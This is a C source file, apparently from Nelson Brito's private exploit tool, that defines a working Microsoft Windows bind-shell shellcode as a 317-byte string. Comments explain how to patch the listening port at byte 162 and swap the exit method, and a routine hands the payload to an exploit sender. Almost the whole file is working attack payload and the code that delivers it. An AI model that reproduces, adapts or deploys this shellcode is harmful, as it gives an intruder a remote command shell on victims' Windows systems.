/* XXX PRIVATE CODE XXX PRIVATE CODE XXX PRIVATE CODE XXX PRIVATE CODE XXX
 * 
 * Copyright© 2004-2008 Nelson Brito
 * This file is part of the ENG Private Tool by Nelson Brito.

   This code is *CONFIDENCIAL, PROPRIETARY and PROTECTED*  from disclosure. 
   Needs to be notified  to Nelson Brito, in the case of this code is being 
   distributed or published in any way.

 * XXX PRIVATE CODE XXX PRIVATE CODE XXX PRIVATE CODE XXX PRIVATE CODE XXX */
#ifndef SHELLCODE_C__
#define SHELLCODE_C__ 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: payload.c,v 1.9 2008-09-14 17:57:14-03 nbrito Exp $ */
#include "common.h"

struct shellcode shellcode [] = {
	{
		"Microsoft Windows Bind Shell",
		/* XXX Here is some gotchas XXX
		   (1) For obvious reasons I must set the size of shellcode, 
		   because shellcode can have NULL (0x00) bytes and strlen()
		   will not work, so I am using sizeof() instead of strlen(). 
		   (2) The 2 bytes containing the port number to bind are 162
		   bytes far, remember that the string begins in [0], so I can
		   replace the port - the default port is 0xffff (65535).
		   (3) It can also replaces the ¨ExitFunc¨:
		   	- ExitFunc = seh     = \xf0\x8a\x04\x5f
			- ExitFunc = process = \x7e\xd8\xe2\x73
			- ExitFunc = thread  = \xef\xce\xe0\x60 */
		"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
		"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
		"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
		"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
		"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
		"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
		"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
		"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
		"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
		"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
		     /*  \xff\xff port 65535/tcp        */
		"\x66\x68\xff\xff\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
		"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
		"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
		"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
		"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
		"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
		"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
		"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
		"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
		     /* ExitFunc \xf0\x8a\x04\x5f SEH   */
		"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0",
		317, /* shellcode size                  */
		162, /* shellcode port position         */
	},
};

/* Payload processing routine. 
   Returns the shellcode structure to be sent by sendexp(). */
const struct shellcode process_shellcode(register u_int32_t id, register u_int32_t option){

	/* Processing shellcode options. */
	switch(option){
		case PROCESS_USER_SHELLCODE:
			break;
		case PROCESS_FIRST_SHELLCODE:
			id = DEFAULT_SHELLCODE_ID;
			break;
		case DISPLAY_ALL_SHELLCODES:
			printf("\n");
			id = sizeof(shellcode)/sizeof(struct shellcode);
			while(id--)
				printf("\t%d - %s\n", id, shellcode[id].id);
			printf("\n");
			exit(EXIT_SUCCESS);
			break;
		default:
			printf("unknown options %d processing payloads\n", option);
			exit(EXIT_FAILURE);
			break;
	}

	/* Warning unlisted shellcode. */
	if(id >= sizeof(shellcode)/sizeof(struct shellcode)){
		printf("unknown or unlisted shellcode %d\n", id);
		exit(EXIT_FAILURE);
	}
	
	return(shellcode[id]);
}
#endif  /* SHELLCODE_C__ */
